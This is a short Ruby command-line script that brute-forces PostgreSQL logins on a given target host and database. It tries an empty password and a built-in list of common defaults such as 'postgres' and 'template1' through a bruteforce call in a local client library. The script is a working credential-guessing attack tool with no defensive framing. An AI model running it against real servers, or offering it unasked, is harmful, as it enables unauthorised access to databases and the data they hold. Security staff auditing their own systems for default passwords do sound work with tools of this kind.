#!/usr/bin/env ruby

$:.unshift File.expand_path("../lib")
require 'postgres_client'

unless ARGV[1]
	puts "Usage: #{$0} [database/]username targethost"
	exit 1
end

user = ARGV[0]
if user.include? "/"
	db,user = user.split("/")
else
	db = "template1"
end

host = ARGV[1]

client = PostgresClient.new(:timeout => 1)
client.db   = db
client.host = host
client.user = user
client.passlist = %w{pg postgres postgres1 template1 default}
client.passlist.unshift ""
client.bruteforce
